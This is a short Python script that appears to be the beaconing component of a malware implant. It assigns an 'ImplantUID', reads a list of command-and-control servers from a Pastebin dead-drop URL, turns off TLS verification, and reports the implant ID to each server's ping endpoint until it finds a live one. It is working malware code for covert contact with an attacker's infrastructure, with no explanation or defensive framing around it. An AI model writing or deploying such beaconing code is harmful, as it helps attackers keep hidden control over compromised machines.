import requests
import uuid
import ast
import urllib3
urllib3.disable_warnings()
ImplantUID = str(uuid.uuid4())
pastebin_id=''
def ServerPoolPaste():        
    ###############################
    # server_pool avail   - True  #
    # else                - False #
    ###############################
    MainPaste = f"https://pastebin.com/raw/{pastebin_id}"
    try:
        server_pool = ast.literal_eval(requests.get(MainPaste, verify=False).text)
        return server_pool
    except:
        return False

def TestServer(server):
    ############################
    # Server Not Alive  - False #
    # Server Not 200    - False #
    # Server Alive      - True  #
    # Server 200        - True  #
    #############################
    if server:
        try:
            response = requests.get(f'{server}/ping/ping/',params={'ImplantUID':ImplantUID}, verify=False)
        except:
            return False
        if response.status_code == 200:
            return True
        return False
    return False
        
def FindAliveServer():
    server_pool = ServerPoolPaste()
    if server_pool:
        for server  in server_pool:
            alive = TestServer(server)
            if alive:
                return server            
    return False

print(FindAliveServer())
